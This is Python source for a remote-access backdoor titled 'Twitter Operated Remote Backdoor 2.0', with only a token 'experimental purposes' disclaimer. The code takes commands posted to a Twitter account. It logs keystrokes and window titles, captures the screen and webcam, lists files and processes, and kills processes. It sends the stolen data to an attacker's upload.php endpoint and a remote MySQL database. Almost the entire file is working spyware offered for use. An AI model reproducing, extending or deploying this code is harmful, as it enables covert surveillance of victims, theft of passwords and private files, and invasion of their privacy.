                                                                     
#  _|_|_|_|_|    _|_|    _|_|_|    _|_|_|          _|_|          _|    
#      _|      _|    _|  _|    _|  _|    _|      _|    _|      _|  _|  
#      _|      _|    _|  _|_|_|    _|_|_|            _|        _|  _|  
#      _|      _|    _|  _|    _|  _|    _|        _|          _|  _|  
#      _|        _|_|    _|    _|  _|_|_|        _|_|_|_|  _|    _|    
                                                                     
# Software: Twitter Operated Remote Backdoor 2.0
# Operating Systems: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 10
# Author: LogicPy

# Disclaimer: I am not responsible for malicious use of this software. This code
# is not intended for malicious use. This code exists for experimental purposes.

import requests
import ctypes
from ctypes import *
import os
from Tkinter import Tk
from tkMessageBox import showinfo
import pyHook, pythoncom, sys, logging
import webbrowser
import wmi
import wx
import cv2
import platform

# Setup:
# --------------------------------------------

#PhpMyAdmin Setup:
# 1) Create Database 'torb2'
# 2) Create table 'directory' with 3 columns   - (id[pk], osName, dir)
# 3) Create table 'keylog' with 3 columns	   - (id[pk], osName, logs)
# 4) Create table 'processes' with 3 columns   - (id[pk], osName, proc)
# 5) Create table 'screenshot' with 3 columns  - (id[pk], osName, img)
# 6) Create table 'webcam' with 3 columns      - (id[pk], osName, cam)

# Twitter Setup:
# 1) Include link for bot - Server checks source for commands.
cntrlPanel = 'http://twitter.com/pyprototype'
# Your server address:
RemoteIP = 'localhost'
# --------------------------------------------

# Global Variables
q = 0
root = Tk()
pushKeys = ""
TableVar = 0
tableName = ""
OSFingerprint = os.environ['COMPUTERNAME']
extr = []
kslv = False

# Log List [Keylog]
grab = []

# Access DLLs [Keylog]
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# Function: Display Windows MessageBox
def showMessage(msgb):
    root.attributes('-topmost', 1)
    root.attributes('-topmost', 0)
    root.attributes('-topmost', 1)              
    showinfo("TORB", msgb)

# Function: Load Header
def initialize():
	print """
 _____ _____ _____ _____    ___   ___ 
|_   _|     | __  | __  |  |_  | |   |
  | | |  |  |    -| __ -|  |  _|_| | |
  |_| |_____|__|__|_____|  |___|_|___|
  Database Edition

"""

# Function: Find Command in Twitter Source Code
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

# Function: Take Windows Screenshot
def screenGrab():
	global usrHandle
	global envoDr
	try:
		usrHandle = os.environ['USERNAME']
		envoDr = 'C:\Users\%s\Downloads\screenshot.png' % (usrHandle)
		app = wx.App()
		screen = wx.ScreenDC()
		size = screen.GetSize()
		bmp = wx.Bitmap(size[0], size[1])
		mem = wx.MemoryDC(bmp)
		mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
		del mem
		bmp.SaveFile(envoDr, wx.BITMAP_TYPE_PNG)
		print envoDr
		upload(envoDr)
	except:
		print "Screenshot Error..."

# Function: Image uploader
def upload(fileUp):
	global RemoteIP
	url = 'http://' + RemoteIP  + '/upload.php'
	data = {'dir':'', 'submit':'Submit'}
	files = {'fileToUpload':('screenshot.png', open(fileUp, 'rb'))}
	r = requests.post(url, data=data, files=files)
	print(r.content)
	print "File uploaded."

# Function: Extract Windows Processes
def procGet():
	processesGathered = []
	proccesesStr = ""

	c = wmi.WMI ()

	for process in c.Win32_Process ():
	  processesGathered.append("%s - [%s]" % (process.Name,process.ProcessId))

	for pgathered in processesGathered:
		proccesesStr = proccesesStr + pgathered + "\n"

	print proccesesStr

	dbsubmit(proccesesStr)

# Function: Terminate Process by ID
def procTerminate(selID):
	os.kill(int(selID), signal.SIGTERM)
	print "Process #%s Terminated!" % (selID)
	# Relay line

# Function: Keyboard Input Capture
def OnKeyboardEvent(event):
	global winTitle
	global hooks_manager
	global pushKeys
	global kslv
	global q

	if event.WindowName != winTitle:
		winTitle = event.WindowName
		getWindowTitle()

	print chr(event.Ascii)
	grab.append( chr(event.Ascii))

	if len(grab) >= 200:
		print '\nSubmitting keys...'
		for keyCon in grab:
			pushKeys = pushKeys + keyCon

		pushKeys = pushKeys.replace("'", '')

		dbsubmit(pushKeys)
		del grab[:]
		kslv = False
		q = 0
		hooks_manager.UnhookKeyboard()
		ctypes.windll.user32.PostQuitMessage(0)
		main()

	else:
		pass

	return True

# Function: Window Title Capture
def getWindowTitle():
	hwnd = user32.GetForegroundWindow()

	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)

	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")

	kernel32.CloseHandle(hwnd)
	return True

# Function: Scan Directory
def ScanDir(selDir):
	global to

	try:
		print "\nScanning Directory: %s..." % (selDir)
		prepDir = "\nScanned Directory (%s):\n" % (selDir)
		dirCollect = os.listdir(selDir)
		for dirScan in dirCollect:
			print dirScan
			prepDir = prepDir + "\n%s" % (dirScan)
		dbsubmit(prepDir)
	except:
		print "Directory Scan Error for (%s)" % (selDir)

# Function: File Extension Extraction
def fileCycle(argExt):
    global extr
    global t
    global bckChck

    folder = "C:\\"
    collectionInb = ''

    print "\nExtracting Files...\n"
    for (paths, dirs, files) in os.walk(folder):
            for file in files:
                if file.endswith(argExt):
                    print os.path.join(paths, file)
                    extr.append(os.path.join(paths, file))
    print "\nExtraction Complete!\n"
    for extScan in extr:
    	collectionInb = collectionInb + extScan + "\n"

    print len(collectionInb)
    dbsubmit(collectionInb)

# Function: Webcam Access
def webcam_Capture():
	global usrHandle
	global envoDr

	cap = cv2.VideoCapture(0)

	ret, frame = cap.read()
	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)

	cv2.imshow('frame', rgb)
	
	if(platform.system()=="Linux"):
		print "Linux OS Detected!"

		# Save web cam screenshot...
		homedir = os.environ['HOME']
		envoDr = '%s/wc_ss.png' % (homedir)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		upload(envoDr)
		print "Web cam screenshot delivered!"
	elif(platform.system()=="Windows"):
		print "Windows OS Detected!"

		# Save web cam screenshot...
		usrHandle = os.environ['USERNAME']
		envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		upload(envoDr)
		print "Web cam screenshot delivered!"
	# Mac condition unfinished...
	elif(platform.system()=="Darwin"):
		print "Mac OS detected!"
		print "Unfinished section..."

# Function: Submit to Database
def dbsubmit(tosubmit):
	global TableVar
	global tableName
	global OSFingerprint
	global RemoteIP

	from mysql import connector
	con = connector.Connect(user='root',password='',database='torb2',host=RemoteIP) # Switch host to remote IP / Port Forwarding necessary
	cur=con.cursor()

	if TableVar == 1:
		tableName = "directory"
		cur.execute("SELECT * FROM directory")
	elif TableVar == 2:
		tableName = "keylog"
		cur.execute("SELECT * FROM keylog")
	elif TableVar == 3:
		tableName = "processes"
		cur.execute("SELECT * FROM processes")
	elif TableVar == 4:
		tableName = "screenshot"
		cur.execute("SELECT * FROM screenshot")

	cur.fetchall()
	rc = cur.rowcount
	rc2 = rc + 1

	cur.execute("""insert into %s values (%s, '%s', '%s')""" % (tableName, rc2, OSFingerprint, tosubmit))
	#cur.execute("""insert into %s values (%s, '%s', load_file('%s'))""" % (tableName, rc2, OSFingerprint, tosubmit))

	con.commit()
	con.close()

# Function: Main - Command Listener (Twitter)
def main():
	global q
	global TableVar
	global hooks_manager
	global kslv

	while(kslv==False):
		r = requests.get(cntrlPanel)
		x = r.content
		z = find_between(x,'data-aria-label-part="0">','</p>')

		if q == z:
			pass

		elif q != z:

			# Commands:
			# msg (string) 				display message
			# scandir (dir)				directory scan
			# scanroot (extension)		scan file format
			# keylog					activate keylogger
			# teleport (website) 		navigate to link
			# opencd					open cd drive
			# pullprocess				gather processes
			# killprocess (id)			kill process
			# screengrab 				capture screenshot
			# webcamview 				screenshot webcam
			# close.door				end server
			# Sleep						idle mode

			# -------- Message Box --------
			# Example: msg Hello World
			#------------------------------
			if "msg" in z: 
				b = z[4:]
				print " Alert sent!"
				try:
					root.withdraw()
					root.after(1000, showMessage(b))
				except:
					pass
				q = z

			# --- Directory Management ---
			# Example: scandir C:/
			# Example: scanroot .doc
			# -----------------------------
			elif "scandir" in z:
				b = z[8:]
				TableVar = 1
				ScanDir(b)
				q = z

			elif "scanroot" in z:
				b = z[9:]
				TableVar = 1
				print "Scanning File Structure from Root."
				try:
					fileCycle(b)
				except:
					pass
				q = z

			# ---------- Keylogger -------------
			# Activated and view Database logs
			# ----------------------------------
			elif z == "keylog":
				print " Keylogger Activated."

				kslv = True
				TableVar = 2

				hooks_manager = pyHook.HookManager()
				hooks_manager.KeyDown = OnKeyboardEvent
				hooks_manager.HookKeyboard()
				pythoncom.PumpMessages()
				q = z

			# ------ Web Browser Navigation ---------
			# Example: teleport http://youtube.com/
			# ---------------------------------------
			elif "teleport" in z:
				c = find_between(z,'_blank" title="','" ><span class="')
				print "Navigating to URL"
				print c
				webbrowser.open(c)
				q = z

			# --------- Open CD Drive ---------
			# Open CD Drive
			# ---------------------------------
			elif z == "opencd":
				print "CD tray opened."
				ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
				q = z

			# ------ Extract Windows Processes ------
			# Gather all processes and view db logs
			# ---------------------------------------
			elif z == "pullprocess":
				TableVar = 3
				print "Pulling Active Processes..."
				try:
					procGet()
				except:
					print "Error pulling processes..."
				q = z

			# ----- Force Close Windows Process -----
			# Example: killprocess 1326
			# ---------------------------------------
			elif "killprocess" in z:
				print "Terminating Process..."
				b = z[12:]
				try:
					procTerminate(b)
				except:
					print "TORB was unable to terminate selected process..."
				q = z

			# ----- Capture Desktop Screenshot -----
			# Capture Windows Screenshot
			# --------------------------------------
			elif z == "screengrab":
				print "Capturing Screen"
				TableVar = 4
				screenGrab()
				q = z

			# ----- Capture Webcam Screenshot -----
			# Activate / Capture Webcam
			# -------------------------------------
			elif z == "webcamview":
				try:
					print "Capturing web cam screenshot..."
					webcam_Capture()
				except:
					print "Webcam not found"
				q = z

			# --------- Shutdown Server ----------
			# Kill the server
			# ------------------------------------
			elif z == "close.door":
				print "Closing the backdoor..."
				sys.exit()

			# ------- Backdoor Sleep Mode -------
			# The backdoor's idle state
			# -----------------------------------
			elif z == "sleep":
				print " Entering sleep state..."
				q = z
			else:
				pass

initialize()
main()